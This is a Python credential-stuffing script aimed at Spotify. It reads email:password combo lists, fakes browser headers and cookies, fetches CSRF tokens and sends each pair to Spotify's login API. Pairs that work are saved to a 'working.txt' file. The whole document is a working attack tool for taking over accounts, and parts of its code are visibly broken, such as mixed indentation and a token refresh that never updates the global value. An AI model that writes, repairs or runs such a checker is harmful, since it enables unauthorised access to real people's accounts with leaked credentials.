import sys
import csv
import requests

working = []

headers = {
    'Origin': 'https://accounts.spotify.com',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Accept': 'application/json, text/plain, */*',
    'Referer': 'https://accounts.spotify.com/en/login/?continue=https:%2F%2Fwww.spotify.com%2Fus%2Faccount%2Foverview%2F&_locale=en-US',
    'Connection': 'keep-alive',
}

numTries = 0
with open("combo.txt") as f:
	reader = csv.reader(f, delimiter=':')
	emails, passwords = zip(*reader)
URL = 'https://accounts.spotify.com/en/login/'
client = requests.session()
# Retrieve the CSRF token first
client.get(URL)  # sets cookie
csrf = str(client.cookies.get_dict()).split('\'')[3]

cookies = {
    'sp_usid': 'ea6cc3ac-5996-4aff-ac90-01ca41fcca2c',
    'sp_t': '9f48csadasdsadas1713363b319b6db589086321cda',
    'sp_new': '1',
    '_ga': 'GA1.2.1172427654.1555900680',
    '_gid': 'GA1.2.2083289698.1555900680',
    '_gcl_au': '1.1.821422761.1555900680',
    '_fbp': 'fb.1.1555900680235.1072066215',
    'sp_ab': '%7B%222019_04_login_redirect_v3%22%3A%22control%22%2C%222019_04_premium_menu%22%3A%22cont$',
    '__bon': 'MHwwfC05NTUwNjI5NDh8LTQwMTEyNjQzODE2fDF8MXwxfDE=',
    '_gat': '1',
    'remember': 'yeeh%40haw.uwu',
    'spot': '%7B%22t%22%3A1555900711%2C%22m%22%3A%22us%22%2C%22p%22%3A%22open%22%7D',
    '_gat_UA-5784146-31': '1',
    '_gali': 'header-login-link',
    'csrf_token': csrf,
    'fb_continue': 'https%3A%2F%2Fwww.spotify.com%2Fus%2Faccount%2Foverview%2F',
}

def getcsrf():
	URL = 'https://accounts.spotify.com/en/login/'

	client = requests.session()

	# Retrieve the CSRF token first
	client.get(URL)  # sets cookie

	csrf = str(client.cookies.get_dict()).split('\'')[3]


	print("Got New CSRF")
getcsrf()
def checkAccount(accountNumber):
  global working
	data = {
  'remember': 'true',
  'username': emails[accountNumber],
  'recaptchaToken': '[YOUR RECAPTCHA TOKEN (Gen one on the login page)',
  'password': passwords[accountNumber],
  'csrf_token': csrf
	}
	response = requests.post('https://accounts.spotify.com/api/login', headers=headers, cookies=cookies, data=data)
	print(response.text)
	if any("displayName" in s for s in response):
		working.append(emails[accountNumber] + ":" + passwords[accountNumber])
		print(working)
		with open('working.txt', 'w') as f:
			for item in working:
				f.write("%s\n" % item)

for i in range(0, len(emails), 1):
	checkAccount(i)
	if numTries == 50:
		getcsrf()
		numTries = 0
	numTries = numTries + 1
